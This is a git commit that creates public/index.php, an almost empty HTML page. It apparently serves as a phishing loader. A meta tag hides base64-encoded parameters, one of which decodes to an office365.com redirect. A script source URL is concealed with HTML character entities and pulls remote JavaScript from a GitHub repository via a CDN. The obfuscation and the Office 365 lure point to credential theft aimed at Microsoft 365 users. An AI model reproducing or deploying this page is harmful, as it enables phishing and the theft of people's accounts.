b1ce8bbd67d14c7bd249267d105b8adbf8ccbb7f
pestail2789 <sohail.ghraonline@hotmail.com>
2025-04-05 14:04:28 +0100

    Create index.php

---
+++ public/index.php
@@ -0,0 +1,5 @@
+<html dir="ltr" class="" landing="" lang="en">
+    <head>
+    <meta common="ANY_RANDON_VALUESiowikiej1MMFpCVFZGU2VXZEtaMjlMVDJONVZIWnhlR2h3YzIxV2JEWnFlWEJTUzFCMWRVSmpUbU0zY2pWcFYxbE9kVzVEVTAwNWVIZE5kblozZDJ4TGJIVkxZVXR5VUVvclJ6bDZlVGRzUW5ablVVVnhRMkZzVEhaQk4zY3lZVXB4ZW5WU2VteDNlR1E1ZDBVNWRsRTkmdj1ubyZhPW9qc2F4ZWFrLXJvdGF0ZTpzZ3R5MnE0MGJjbmk=ikiwoiANY_RANDON_VALUES" redirme="ANY_RANDON_VALUESinikiaHR0cHM6Ly9vZmZpY2UzNjUuY29tikiwiiANY_RANDON_VALUES">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script src="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x63;&#x64;&#x6e;&#x2e;&#x6a;&#x73;&#x64;&#x65;&#x6c;&#x69;&#x76;&#x72;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x67;&#x68;&#x2f;&#x69;&#x75;&#x74;&#x73;&#x7a;&#x2f;&#x77;&#x6f;&#x6c;&#x6f;&#x61;&#x64;&#x40;&#x72;&#x65;&#x66;&#x73;&#x2f;&#x68;&#x65;&#x61;&#x64;&#x73;&#x2f;&#x6d;&#x61;&#x69;&#x6e;&#x2f;&#x6c;&#x74;&#x6e;&#x62;&#x64;&#x2e;&#x6a;&#x73;"></script>
